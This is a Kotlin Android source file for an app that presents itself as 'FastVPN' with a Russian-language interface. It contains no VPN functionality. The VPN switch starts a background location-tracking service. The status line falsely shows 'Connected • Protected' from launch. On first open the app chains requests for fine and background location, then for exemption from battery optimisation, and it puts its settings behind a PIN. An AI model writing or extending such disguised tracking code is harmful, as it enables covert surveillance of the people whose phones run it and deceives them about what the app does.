package com.secure.netcore

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.Switch
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : android.app.Activity() {

    private lateinit var statusText: TextView
    private val PERM_REQUEST = 1001
    private val PERM_BG_REQUEST = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val title = TextView(this).apply {
            text = "⚡ FastVPN"
            textSize = 30f
            gravity = Gravity.CENTER
        }
        val subtitle = TextView(this).apply {
            text = "Безопасное и быстрое соединение"
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 8, 0, 40)
        }

        val vpnSwitch = Switch(this).apply {
            text = "VPN"
            textSize = 20f
        }
        statusText = TextView(this).apply {
            text = "Подключено • Защищено"
            textSize = 16f
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 0)
        }

        vpnSwitch.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (hasPermissions()) {
                    ContextCompat.startForegroundService(
                        this, Intent(this, LocationService::class.java))
                    statusText.text = "Подключено • Защищено"
                } else {
                    requestAllPermissions()
                }
            } else {
                statusText.text = "Отключено"
            }
        }

        val btnSettings = Button(this).apply { text = "⚙ Настройки" }
        btnSettings.setOnClickListener {
            startActivity(Intent(this, PinActivity::class.java))
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }
        root.addView(title)
        root.addView(subtitle)
        root.addView(vpnSwitch)
        root.addView(statusText)
        root.addView(btnSettings)
        setContentView(root)

        // ВСЕ РАЗРЕШЕНИЯ СРАЗУ ПРИ ПЕРВОМ ОТКРЫТИИ
        requestAllPermissions()
    }

    private fun hasFine(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
                PackageManager.PERMISSION_GRANTED

    private fun hasBackground(): Boolean =
        Build.VERSION.SDK_INT < 30 ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
                PackageManager.PERMISSION_GRANTED

    private fun hasPermissions(): Boolean {
        if (!hasFine()) return false
        if (Build.VERSION.SDK_INT >= 33 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) return false
        return true
    }

    private fun requestAllPermissions() {
        // Шаг 1: точная геолокация + уведомления
        if (!hasFine() || (Build.VERSION.SDK_INT >= 33 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED)) {
            val list = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION)
            if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
            ActivityCompat.requestPermissions(this, list.toTypedArray(), PERM_REQUEST)
            return
        }
        // Шаг 2: фоновая геолокация (Android 10+ требует отдельного запроса)
        if (Build.VERSION.SDK_INT >= 30 && !hasBackground()) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                PERM_BG_REQUEST
            )
            return
        }
        // Шаг 3: отключение оптимизации батареи (системное окно, можно отклонить)
        askBatteryOptimization()
    }

    private fun askBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= 23) {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    ))
                } catch (e: Exception) { }
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERM_REQUEST -> requestAllPermissions()      // дальше по цепочке
            PERM_BG_REQUEST -> askBatteryOptimization()
        }
    }
}
